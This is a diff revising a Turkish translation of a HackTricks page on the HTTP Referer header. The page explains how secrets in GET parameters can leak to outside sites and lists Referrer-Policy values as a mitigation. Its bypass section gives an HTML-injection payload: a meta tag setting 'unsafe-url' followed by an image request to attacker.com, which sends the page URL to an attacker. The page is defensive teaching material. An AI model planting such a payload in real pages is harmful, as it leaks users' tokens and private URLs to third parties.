@@ -1,29 +1,30 @@
+{% hint style="success" %}
+AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hackleme becerilerinizi sıfırdan kahraman seviyesine çıkarın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>
+<summary>HackTricks'ı Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek hacking püf noktalarını paylaşın.
 
 </details>
+{% endhint %}
 
 
-# Yönlendirici başlıkları ve politikası
+# Referans başlıkları ve politika
 
-Yönlendirici, tarayıcıların önceki ziyaret edilen sayfayı belirtmek için kullandığı başlıktır.
+Referrer, tarayıcıların önceki ziyaret edilen sayfayı belirtmek için kullandığı başlıktır.
 
-## Sızan hassas bilgiler
+## Sızdırılan Hassas Bilgiler
 
-Web sayfasının içinde herhangi bir noktada GET isteği parametrelerinde hassas bilgiler bulunuyorsa, sayfa harici kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcının saldırgan tarafından kontrol edilen bir URL'yi ziyaret etmesini/sunmasını (sosyal mühendislik) sağlayabiliyorsa, saldırgan en son GET isteği içindeki hassas bilgileri dışarı çıkarabilir.
+Eğer bir web sayfasının içinde herhangi bir noktada GET isteği parametrelerinde hassas bilgi bulunuyorsa, sayfa harici kaynaklara bağlantılar içeriyorsa veya bir saldırgan kullanıcıyı saldırganın kontrol ettiği bir URL'yi ziyaret etmeye ikna edebiliyorsa (sosyal mühendislik), saldırgan en son GET isteği içindeki hassas bilgiyi dışarıya çıkarabilir.
 
 ## Hafifletme
 
-Tarayıcının başka web uygulamalarına hassas bilgilerin gönderilmesini **önleyebilecek** bir **Yönlendirici politikası** izlemesini sağlayabilirsiniz:
+Tarayıcının diğer web uygulamalarına hassas bilginin gönderilmesini **önleyebilecek** bir **Referrer politikası** izlemesini sağlayabilirsiniz:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -36,26 +37,11 @@ Referrer-Policy: unsafe-url
 ```
 ## Karşı Önlem
 
-Bu kuralı geçersiz kılmak için bir HTML meta etiketi kullanabilirsiniz (saldırganın HTML enjeksiyonu kullanması gerekmektedir):
+Bu kuralı geçersiz kılmak için bir HTML meta etiketi kullanabilirsiniz (saldırganın bir HTML enjeksiyonu yapması gerekmektedir):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Savunma
 
-Asla hassas verileri URL'deki GET parametreleri veya yollarda kullanmayın.
-
-
-<details>
-
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
-
-HackTricks'i desteklemenin diğer yolları:
-
-* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.
-
-</details>
+Asla URL içinde GET parametrelerine veya yollara hassas veri koymayın.
